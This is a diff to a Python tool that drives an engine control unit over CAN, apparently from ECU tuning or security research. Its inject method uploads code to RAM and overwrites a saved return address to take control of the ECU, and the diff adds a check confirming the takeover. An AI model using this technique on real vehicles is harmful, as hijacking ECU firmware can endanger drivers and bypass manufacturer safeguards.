@@ -35,8 +35,8 @@ class ECU_T4E:
 
 	def openCAN(self, can_if):
 		self.log("Configure "+can_if+" @ 1 Mbit/s")
-		os.system("ip link set "+can_if+" down")
-		os.system("ip link set "+can_if+" up type can bitrate 1000000 restart-ms 50 loopback off")
+		#os.system("ip link set "+can_if+" down")
+		#os.system("ip link set "+can_if+" up type can bitrate 1000000 restart-ms 50 loopback off")
 
 		self.log("Open "+can_if)
 		self.sock = socket.socket(socket.AF_CAN,socket.SOCK_RAW,socket.CAN_RAW);
@@ -162,8 +162,18 @@ class ECU_T4E:
 	def inject(self, freeram_address, filename, stackblr_address):
 		self.upload(freeram_address, filename)
 		value = self.readMemory(stackblr_address, 4)
-		print("Previous return address 0x"+value.hex())
+		self.log("Previous return address 0x"+value.hex())
 		self.writeMemory(stackblr_address, struct.pack(">I", freeram_address), False)
+		try:
+			cf = self.sock.recv(CAN_FRA_SIZE)
+			id, dlc, data = struct.unpack(CAN_HDR_FRMT+"6s2x", cf)
+			if(dlc != 6 or data != "Hello!"):
+				raise ECUException("Unexpected answer!")
+			else:
+				self.log("We have the control of the ECU!")
+		except socket.timeout:
+			raise ECUException("Injection failed!") from None
+
 		
 	def test(self, freeram_address):
 		# Word
